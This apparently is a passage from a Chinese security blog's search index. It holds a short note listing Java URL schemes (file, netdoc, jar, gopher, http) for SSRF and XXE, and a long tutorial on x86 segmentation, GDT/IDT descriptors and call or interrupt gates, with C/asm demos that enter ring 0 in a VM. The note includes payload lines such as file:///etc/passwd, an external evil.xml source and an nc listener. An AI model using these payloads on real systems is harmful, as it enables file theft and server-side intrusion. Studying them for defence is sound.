        <tags>
            
            <tag> 科学上网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java协议</title>
      <link href="/2019/11/10/java%E5%8D%8F%E8%AE%AE/"/>
      <url>/2019/11/10/java%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="java协议"><a href="#java协议" class="headerlink" title="java协议"></a>java协议</h2><p>JAVA默认提供了对file,ftp,gopher,http,https,jar,mailto,netdoc协议的支持。</p><h3 id="file-ssrf、xxe-："><a href="#file-ssrf、xxe-：" class="headerlink" title="file(ssrf、xxe)："></a>file(ssrf、xxe)：</h3><p> file:///etc/passwd</p><h3 id="netdoc-ssrf、xxe-："><a href="#netdoc-ssrf、xxe-：" class="headerlink" title="netdoc(ssrf、xxe)："></a>netdoc(ssrf、xxe)：</h3><p>知道文件名和文件路径，很简单我们只要知道文件路径然后利用我们的 netdoc 去列目录就能知道文件名了<br>netdoc:///var/www/html/<br>不常见</p><blockquote><p>ps:过滤了file、gopher可使用netdoc代替</p></blockquote><h3 id="jar-ssrf、xxe"><a href="#jar-ssrf、xxe" class="headerlink" title="jar(ssrf、xxe):"></a>jar(ssrf、xxe):</h3><p>jar:<a href="http://localhost:9999/jar.zip!/1.php">http://localhost:9999/jar.zip!/1.php</a></p><h3 id="http-ssrf、xxe"><a href="#http-ssrf、xxe" class="headerlink" title="http(ssrf、xxe):"></a>http(ssrf、xxe):</h3><p><a href="http://url/file.ext">http://url/file.ext</a><br><a href="http://example.com/evil.xml">http://example.com/evil.xml</a></p><h3 id="gopher-ssrf、xxe"><a href="#gopher-ssrf、xxe" class="headerlink" title="gopher(ssrf、xxe):"></a>gopher(ssrf、xxe):</h3><p>gopher://ip:port/xxx</p><blockquote><p>监听：nc -vv -l -p port</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建</title>
      <link href="/2019/09/10/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/09/10/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8df105d85bff050e063b9b46f0df0ca84eec1d8a6ed7217438a8a9b11bef0ba4"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是感染了</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内核基础</title>
      <link href="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/"/>
      <url>/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="分段机制"><a href="#分段机制" class="headerlink" title="分段机制"></a>分段机制</h2><ul><li>在 32 位保护模式下，段寄存器就不会再直接保存段基址了，而是分成了<strong>可见的 16 位段选择子</strong>部分和<strong>不可见的 80 位高速缓冲</strong>部分，对于访问内存需要用到的一些信息，例如段的基址、限长和访问属性等都会被保存在这里的不可见部分。这一部分的内容无法人为的直接读取到，在段寄存器进行切换时会被 CPU 自动加载。首先，会解析 16 位的段选择子部分，从 TI 位获取到要使用的是哪一张表(GDT?LDT?)，由于Windows没有使用LDT，所以目前保存的都是 0，再从 INDEX 获取表内元素的下标，再进行权限检查后，从中加载段的信息到不可见的高速缓存部分。</li><li>在16位上是段基址，在32位上是段选择子</li></ul><h3 id="段选择子"><a href="#段选择子" class="headerlink" title="段选择子"></a>段选择子</h3><ul><li>从下面的结构体定义可以看出，段选择子由 INDEX、TI 以及 RPL 组成，其中 RPL 全称为请求权限级别，表示当前使用什么样的权限发出请求，TI 位指定了当前查找的是 GDT(0) 还是 LDT(1)，INDEX 标识的是索引，需要将 index 配合 ti 位一起使用，找到最终的 <strong>段描述符</strong>。</li><li>段选择子是一个16位的数值，高13位为全局描述表的索引，第三位索引GDT，LDT，低两位为请求特权级</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SELECTOR</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> index: <span class="number">13</span>;<span class="comment">// index 是存在于 GDT 或 LDT 中元素的索引</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>    ti:  <span class="number">1</span>;<span class="comment">// 为 0 表示 GDT 否则是 LDT，windows 始终各为 0</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>   rpl:  <span class="number">2</span>;<span class="comment">// 请求权限级别，表示使用什么样的权限访问</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="段描述符"><a href="#段描述符" class="headerlink" title="段描述符"></a>段描述符</h3><ul><li>GDT 或 LDT 中保存的就是段描述符，每一个段描述符都描述了段的一些信息，32位下，大小为 8 字节(64位)</li><li>在 windbg 中使用 gdtr 寄存器可以获取段描述符的基址，gdtl 获取段描述符的限长。</li><li>通过汇编指令 rgdt 获取 gdt 寄存器，还可以通过 lgdt(特权指令) 设置 gdt 寄存器的内容。</li><li>描述一个段的位置和大小信息以及访问控制的状态信息，存在GDTR寄存器指向的内存中</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_DESCRIPTOR</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> limit1: <span class="number">16</span>;<span class="comment">// 段限长 [0~15]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> base1:  <span class="number">16</span>;<span class="comment">// 段基址 [0~15]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> base2:   <span class="number">8</span>;<span class="comment">// 段基址 [16~23]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> type:    <span class="number">4</span>;<span class="comment">// 段的类型</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> s:  <span class="number">1</span>;    <span class="comment">// 当前是系统段还是用户段</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> dpl:     <span class="number">2</span>;                <span class="comment">// 访问当前段需要用到的权限</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> p:       <span class="number">1</span>;                <span class="comment">// 表示当前的段是否是有效的</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> limit2:  <span class="number">4</span>;                <span class="comment">// 段限长 [16~19]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> avl:     <span class="number">1</span>;                <span class="comment">// 保留给操作系统的</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> L:       <span class="number">1</span>;                <span class="comment">// 是否是长模式</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> db:      <span class="number">1</span>;                <span class="comment">// 默认使用的单位</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> G:       <span class="number">1</span>;                <span class="comment">// 表示 limit 的单位</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> base3:   <span class="number">8</span>;                <span class="comment">// 段基址 [24~31]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>*Base: 由 3 个部分组成，分别对应了 32 位基址的 0 ~ 15、16 ~ 23 以及 24 ~ 31 位，表示段基地址</p></li><li><p>P: 是切换寄存器时检查的第一个位，表示当前的段描述符是否是有效的，如果有效为 1，否则为 0</p></li><li><p>AVL：对于 i386 的所有处理器来说，CPU 都不会使用它，会将它留给用户（操作）进行操作</p></li><li><p>L: 如果当前的处理哦其处于 64 位模式，就会提供 L 位进行标识，表示当前使用的是长模式</p></li><li><p>*DPL：目标请求级别，描述的是想要访问当前的段描述符必须拥有的权限，权限通常要小于RPL\CPL，DPL是目标代码段的访问权限，CPL当前执行权限，RPL代码段权限</p></li><li><p>Limit 和 G 位：Limit 由两个部分组成，共使用了 20 位的数据表示段限长，当 G 位为 0 时，Limit 的单位就是 1Byte，当 G 位为 1 时，Limit 的单位就是 0x1000(4KB)，所以Limit 的值最大可能是下面的情况</p><ul><li>若 G 为 1：假设 Limit 为 0xFFFFF，此时最终限长为 0xFFFFF × 0x1000 + 0xFFF -&gt; 0xFFFFFFFF</li><li>若 G 为 0：假设 Limit 为 0xFFFFF，此时最终限长为 0xFFFFF × 1 -&gt; 0xFFFFF</li></ul></li><li><p>D\B：用于设置默认操作数的大小和默认地址的大小。对于栈来说，通常将这一位成为 B 位，当 B 位为1时，默认对 ESP 的操作是以 4 字节计算的，例如 push 1 实际执行了 sub esp, 4 的操作。对于其它情况，该位被称作 D 位，表示默认使用的是 4 字节还是 2 字节。通过 OPCODE 指令前缀可以修改操作数和地址大小。</p><p>当前是代码段时 D = 1采用32位寻址方式,D = 0 采用16位寻址方式</p><p>当前是数据段是 D = 1 无论是向上拓展还是向下都是4Gb, D=0 它的拓展范围只有64kb</p></li></ul><p><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/1.png" alt="image-1"></p><p>用户段</p><ul><li>当 S 位为 1 时，表示当前就是用户段，用户段又存在了两种状态，分别是代码段和数据段，</li><li>S位为0时，是系统，TYPE代表这个段的调用门，陷阱门，任务门</li><li><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/2.png" alt="image-2"></li><li>如果 TYPE 位的最高位为 1，就表示当前是代码段，此时看到的 TYPE 整体会大于 7<ul><li>C: 表示当前是否是一致代码段。如果但其概念是一致代码段，就表示我们可以使用低权限访问高权限的内容。如果但其概念是非一致代码段，那么要求访问者个被访问者权限必须一致 。</li><li>R: 当前的段是否是可读的</li><li>A: 表示当前的段是否被访问了，如果被访问了就为 1</li></ul></li><li>如果 TYPE 位的最高位为 0，就表示当前是数据段，此时看到的 TYPE 整体会小于 8</li><li>E: 表示当前是向上扩展(extend-up)段还是向下扩展(extend-down)段</li><li><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/3.png" alt="image-3"></li><li>W: 表示当前的段是可写的</li><li>A: 表示当前的段是否被访问了，如果被访问了就为 1</li></ul><h3 id="手动解析"><a href="#手动解析" class="headerlink" title="手动解析"></a>手动解析</h3><ul><li>0008 -&gt; 双机调试 CS = 1(INDEX) + 0(TI) + 00(RPL)，通过 dq gdtr+(INDEX*8) 找到段描述符<ul><li><strong>00</strong>cf9b<strong>00</strong>`<strong>0000</strong>ffff: base 表示当前的<strong>段基址</strong>为 0</li><li>00<strong>cf</strong>9b00`0000<strong>ffff</strong>：limit 为 0xFFFFF，G位是C的最高位表示1，所以LIMIT 是 0xFFFFFFFF</li><li>00<strong>c</strong>f9b00`0000ffff：除了 G 位，分别为 DB(1)、L(0) 和 AVL(0)，只有 DB 是有意义的</li><li>00cf<strong>9</strong>b00`0000ffff：9对应了 P(1) + DPL(00) + S(1)，说明当前是一个有效的仅R0能访问的用户段</li><li>00cf9<strong>b</strong>00`0000ffff：b大于8，说明是代码段，三个属性分别是 0(非一致) 1(可读) 1(访问过)</li></ul></li><li>001b -&gt; 用户程序CS = 11(INDEX) + 0(TI) + 11(RPL)，通过 dq gdtr+(INDEX*8) 找到段描述符<ul><li>00cffb00`0000ffff：base 表示当前的<strong>段基址</strong>为 0</li><li>00cffb00`0000ffff：limit 为 0xFFFFF，G位是C的最高位表示1，所以LIMIT 是 0xFFFFFFFF</li><li>00cffb00`0000ffff：除了 G 位，分别为 DB(1)、L(0) 和 AVL(0)，只有 DB 是有意义的</li><li>00cf<strong>f</strong>b00`0000ffff：F对应了 P(1) + DPL(11) + S(1)，说明当前是一个有效的需要R3能访问的用户段</li><li>00cff<strong>b</strong>00`0000ffff：b大于8，说明是代码段，三个属性分别是 0(非一致) 1(可读) 1(访问过)</li></ul></li><li>随便找的一个数据段，对应 TI 和 INDEX 分别是 0 和 10，DPL是0表示选择子最低两位应该是0<ul><li><strong>00</strong>cf93<strong>00</strong>`<strong>0000</strong>ffff：base 表示当前的<strong>段基址</strong>为 0</li><li>00<strong>cf</strong>9300`0000<strong>ffff</strong>：limit 为 0xFFFFF，G位是C的最高位表示1，所以LIMIT 是 0xFFFFFFFF</li><li>00cf9300`0000ffff：除了 G 位，分别为 DB(1)、L(0) 和 AVL(0)，只有 DB 是有意义的</li><li>00cf<strong>9</strong>300`0000ffff：9对应了 P(1) + DPL(00) + S(1)，说明当前是一个有效的仅R0能访问的用户段</li><li>00cf9<strong>3</strong>00`0000ffff：3小于 7 是数据段，三个属性分别是 E(向上扩展) W(可写) A(访问了)</li></ul></li></ul><h4 id="权限检查"><a href="#权限检查" class="headerlink" title="权限检查"></a>权限检查</h4><ul><li><p>通过 lxs 和 mov xs, ax 可以切换段选择子 加载段选择符进入段寄存器的时候</p><ul><li>CS寄存器只能存放代码段的选择符</li><li>代码段选择符可以被加载到数据段寄存器，但是不可读的代码段选择符不能被加载进入数据段寄存器（因为数据段都是可读的）</li><li>只有可读可写数据段选择符才能加载到SS寄存器（SS寄存器一定是可写的）</li></ul></li><li><p>当前接触到的三种权限：</p><ul><li><p>CPL：特指 CS 段寄存器的最低两位，表示当前所拥有(当前执行代码)的权限</p><ul><li>当前操作系统登录用户的权限</li></ul></li><li><p>RPL：指任何一个段选择子的最低两位，表示使用什么样的权限进行请求</p><ul><li>当前是否使用了管理员方式打开目标程序</li></ul></li><li><p>DPL：想要切换到当前的段描述符需要什么样的权限</p><ul><li>当前的应用程序最少需要使用什么样的权限</li><li><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/4.png" alt="image-4"></li></ul><h4 id="代码间的跳转"><a href="#代码间的跳转" class="headerlink" title="代码间的跳转"></a>代码间的跳转</h4><p>JMP 0x20:0x004183D7 CPU怎么指向这段代码</p><ol><li><p>段选择子拆分</p><p>0x20对应二进制 0000 0000 0010 0000</p><p>RPL = 00</p><p>Ti = 0</p><p>Index = 4</p></li><li><p>查表得到段描述符</p><p>Ti = 0 所以查GDT表</p><p>Index = 4 找到对应的段描述符</p><p>四种情况可以跳转: 代码段,调用门,TSS任务段,任务门</p></li><li><p>权限检查</p><p>如果是非一致代码段,要求CPL == DPL &amp;&amp; RPL &lt;= DPL</p><p>如果是一致代码段,要求CPL &gt;= DPL</p></li><li><p>加载段描述符</p><p>通过上面的权限检查后,cpu会将段描述符加载到cs段寄存器中</p></li><li><p>代码执行</p><p>cpu将 cs.base + Offset 的值写入eip然后执行cs:eip处的代码,段间跳转结束</p></li></ol><h3 id="调用门"><a href="#调用门" class="headerlink" title="调用门"></a>调用门</h3></li></ul></li></ul><p><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/5.png" alt="image-5"></p><p>1100</p><p>查看GDT表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; r gdtr</span><br><span class="line">gdtr=80b95000</span><br><span class="line">kd&gt; r gdtl</span><br><span class="line">gdtl=000003ff</span><br></pre></td></tr></table></figure><h4 id="跨段调用"><a href="#跨段调用" class="headerlink" title="跨段调用"></a>跨段调用</h4><p>调用提权</p><p><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/6.png" alt="image-6"></p><p>调用不提权</p><p><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/7.png" alt="image-7"></p><p>跨段调用时,一旦有权限切换,就会跟着切换栈</p><p>CS的权限一旦改变,SS的权限也要随着改变,CS与SS的等级必须一样</p><p>JMP FAR 只能跳转到同级的一致代码段,但CALL FAR可以通过调用门提权,提升CPL权限</p><p>注: SS与ESP从那里来?参见TSS段</p><h4 id="调用门执行流程"><a href="#调用门执行流程" class="headerlink" title="调用门执行流程"></a>调用门执行流程</h4><p>指令格式 CALL CS:EIP(EIP是废弃的)</p><p>执行步骤:</p><p> 根据CS的值查GDT表,找到对应的段描述符,这个描述符是一个调用门</p><p> 在调用门描述符中存储另一个代码段的段选择子</p><p> 选择子指向的段 段.Base + 偏移地址 就是真正要执行的地址</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CALLGATE</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset1 : <span class="number">16</span>;<span class="comment">// 提权后执行代码的低地址</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> selector : <span class="number">16</span>;<span class="comment">// 需要提升的权限对应的选择子</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> paramcount : <span class="number">5</span>;<span class="comment">// 提权后执行的代码用到的参数</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> : <span class="number">3</span>;<span class="comment">// 保留位</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> type : <span class="number">4</span>;<span class="comment">// 对于调用门始终是 1100 </span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> S : <span class="number">1</span>;<span class="comment">// 对于调用门始终是 0</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> DPL : <span class="number">2</span>;<span class="comment">// 访问我需要的权限，应该写 3</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> P : <span class="number">1</span>;<span class="comment">// 必须是有效的段描述符</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset2 : <span class="number">16</span>;<span class="comment">// 提权后执行代码的高地址</span></span><br><span class="line">&#125; CALLGATE, *PCALLGATE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在进行权限切换的过程中，栈也会随之改变</span></span><br><span class="line"><span class="type">short</span> r0_ss = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> r0_esp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 裸函数，只生成用户编写的代码，在其中操作高地址空间</span></span><br><span class="line">_declspec(naked) <span class="function"><span class="type">void</span> <span class="title">r0_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> <span class="number">3</span></span><br><span class="line">mov r0_ss, ss; 获取 r0 权限的 ss</span><br><span class="line">mov r0_esp, esp; 获取 r0 权限的 esp</span><br><span class="line">retf; 调用门必须使用 retf 进行返回</span><br><span class="line"></span><br><span class="line">; 实现通过调用门读取到 gdt 中的第 <span class="number">3</span> 项</span><br><span class="line">; sgdt 可以获取 gdt 的地址</span><br><span class="line">; 对于中断门和陷阱门必须使用 iretd</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 根据当前函数的位置，构建一个调用门，用于进行跳转</span></span><br><span class="line"><span class="comment">// offset: 0045???? ????6c20-&gt; 需要跳转的偏移</span></span><br><span class="line"><span class="comment">// selector: ???????? 0008???? (1 0 00) -&gt;  需要切换的权限</span></span><br><span class="line"><span class="comment">// DPL: ????E??? ????????-&gt; 访问当前调用门的权限</span></span><br><span class="line"><span class="comment">// TYPE: ?????C?? ????????-&gt; 当前是一个调用门描述符</span></span><br><span class="line"><span class="comment">//00456BC0 00456BC0</span></span><br><span class="line"><span class="comment">// 0045EC00`00086BC0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 构建一个远跳的地址，在远跳中，偏移是没有意义的，给什么都哦可以</span></span><br><span class="line"><span class="comment">//后面保存的是段选择子，可以用于找到调用门描述符，要求 RPL &lt;= DPL</span></span><br><span class="line"><span class="comment">//- 0x004B -&gt; 01001(INDEX) 0(TI) 11(RPL)</span></span><br><span class="line">BYTE dest[] = &#123; <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4B</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line"><span class="comment">//char dest[6] = &#123;&#125;;</span></span><br><span class="line"><span class="comment">//*(DWORD*)&amp;dest[0] = 0x12345678;</span></span><br><span class="line"><span class="comment">//*(DWORD*)&amp;dest[4] = 0x48;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 使用 call far 语句，跳转到指定的调用门中，在进行R3到R0 的转化的</span></span><br><span class="line"><span class="comment">//时候 CPU 会默认的将用户 SS ESP CS IP 保存到栈中</span></span><br><span class="line">__asm push fs</span><br><span class="line">__asm call fword ptr dest;</span><br><span class="line">__asm pop fs</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 输出 R0 下的 esp 和 ss，如果R0代码设置断点，那么 fs 会被改变，调</span></span><br><span class="line"><span class="comment">//用函数会崩溃，需要在进入门之前先进行保存</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%04X: %08X\n&quot;</span>, r0_ss, r0_esp);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将构造的门描述符填写到索引处,再将生成好到程序放到虚拟机中执行</p><p><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/8.png" alt="image-8"></p><p>输入指令 g 直接运行</p><p><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/9.png" alt="image-9"></p><p>注意，如果在返回时需要改变特权级，将会检查段寄存器DS、ES、FS、GS的内容，如果在它们之中，某个寄存器的中的选择子所指向的数据段描述符的DPL权限比返回后的CPL(CS.RPL)高,即数值上返回后的CPL&gt;数据断描述符的DPL,处理器将会把数值0填充到相应的段寄存器。</p><h3 id="IDT表"><a href="#IDT表" class="headerlink" title="IDT表"></a>IDT表</h3><h4 id="IDT表概述"><a href="#IDT表概述" class="headerlink" title="IDT表概述"></a>IDT表概述</h4><p>IDT即中断描述符表,同GDT一样,IDT也是由一系列描述符组成,每个描述符占8个字节.但要注意的是,IDT表的第一个元素不是NULL</p><p>在Windbg中查看IDT表的基址和长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; r idtr</span><br><span class="line">idtr=80b95400</span><br><span class="line">kd&gt; r idtl</span><br><span class="line">idtl=000007ff</span><br></pre></td></tr></table></figure><h4 id="IDT表构成"><a href="#IDT表构成" class="headerlink" title="IDT表构成"></a>IDT表构成</h4><p>IDT表可以包含三种门描述符:</p><p>iretd 返回</p><h4 id="中断门描述符"><a href="#中断门描述符" class="headerlink" title="中断门描述符"></a>中断门描述符</h4><p>中断门</p><p>1110</p><p><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/10.png" alt="image-10"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在进行权限切换的过程中，栈也会随之改变</span></span><br><span class="line"><span class="type">short</span> r0_ss = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> r0_esp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 裸函数，只生成用户编写的代码，在其中操作高地址空间</span></span><br><span class="line">_declspec(naked) <span class="function"><span class="type">void</span> <span class="title">r0_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//int 3</span></span><br><span class="line">mov r0_ss, ss; 获取 r0 权限的 ss</span><br><span class="line">mov r0_esp, esp; 获取 r0 权限的 esp</span><br><span class="line">iretd; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//中断门</span></span><br><span class="line"><span class="comment">// 1. 根据当前函数的位置，构建一个中断门，用于进行跳转</span></span><br><span class="line"><span class="comment">// offset: 0045???? ????6c20-&gt; 需要跳转的偏移</span></span><br><span class="line"><span class="comment">// selector: ???????? 0008???? (1 0 00) -&gt;  需要切换的权限</span></span><br><span class="line"><span class="comment">// DPL: ????E??? ????????-&gt; 访问当前中断门的权限</span></span><br><span class="line"><span class="comment">// TYPE: ?????E?? ????????-&gt; 当前是一个中断门描述符</span></span><br><span class="line"><span class="comment">//制造中断,使其调用中断门描述符</span></span><br><span class="line"><span class="comment">//00456BC0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//0045EE0000086BC0</span></span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">push fs</span><br><span class="line"><span class="type">int</span> <span class="number">32</span></span><br><span class="line">pop fs</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%04X: %08X\n&quot;</span>, r0_ss, r0_esp);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span 